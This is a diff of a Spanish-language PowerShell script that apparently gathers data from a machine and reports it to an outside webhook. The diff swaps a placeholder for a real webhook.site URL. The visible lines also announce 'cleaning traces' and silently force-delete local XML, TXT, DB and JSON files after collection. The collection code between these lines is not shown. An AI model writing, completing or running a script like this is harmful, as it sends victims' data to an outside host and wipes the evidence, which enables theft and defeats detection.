@@ -1,5 +1,5 @@
 # ---------- CONFIGURACIÓN ----------
-$webhook = "https://webhook.site/TU_URL_DEL_WEBHOOK"   # <-- CAMBIA ESTO
+$webhook = "https://webhook.site/20218d5c-4686-49c8-bad0-1f2809f37e17"   # <-- CAMBIA ESTO
 # ------------------------------------
 
 Write-Host "[*] Iniciando recolección de datos..." -ForegroundColor Cyan
@@ -124,5 +124,6 @@ try {
 Write-Host "[*] Limpiando rastros..." -ForegroundColor Yellow
 Remove-Item *.xml,*.txt,*.db,*.json -Force -ErrorAction SilentlyContinue
 Write-Host "[OK] Limpieza completada." -ForegroundColor Green
+
 
 Write-Host "[*] Proceso finalizado." -ForegroundColor Cyan
